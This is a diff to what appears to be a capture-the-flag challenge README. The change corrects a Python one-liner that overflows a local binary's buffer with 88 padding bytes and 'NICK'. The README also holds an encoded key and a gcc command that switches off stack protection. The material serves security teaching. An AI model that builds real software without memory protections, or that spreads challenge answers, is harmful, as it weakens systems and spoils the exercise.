@@ -8,7 +8,7 @@ NOTE: Server code is also included in the repository. This will be running on th
 
 Key: aSByZWFsbHkgaG9wZSBsaWZlIGdldHMgZWFzaWVyLi4u
 
-Solution: One way to solve this would be to use a scripting language to overflow the buffer. Example solution: python -c 'print "A"*88 + "NICK' | ./buff
+Solution: One way to solve this would be to use a scripting language to overflow the buffer. Example solution: python -c 'print "A"*88 + "NICK"' | ./buff
 
 To compile: We have to disable the overflow protection. During testing I had compiled using the following command:
  gcc -Wall -fno-stack-protector -D_FORTIFY_SOURCE=0 buff.c -o buff
